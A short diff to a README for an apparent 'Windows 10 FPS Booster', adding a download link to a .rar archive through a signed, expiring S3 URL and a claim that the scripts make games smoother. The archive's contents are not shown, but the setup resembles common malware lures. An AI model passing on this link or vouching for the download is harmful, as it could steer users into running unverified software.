@@ -1,5 +1,6 @@
 ## Windows 10 FPS Booster 
 
+#### DOWNLOAD : [Click Here](https://github-releases.githubusercontent.com/385052042/ad126d00-e2c6-11eb-8a3c-2656454f44fb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210711%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210711T212932Z&X-Amz-Expires=300&X-Amz-Signature=685af41980cdb83b613ad86f220b6c9bc3f744e78200e949edfd5e6d1e14c2c7&X-Amz-SignedHeaders=host&actor_id=85826349&key_id=0&repo_id=385052042&response-content-disposition=attachment%3B%20filename%3DWindows.10.Booster.FPS.rar&response-content-type=application%2Foctet-stream) 🎈
 
 ##### Hello, this is the scripts I use to customize after windows install, it makes game play smoothly.
 
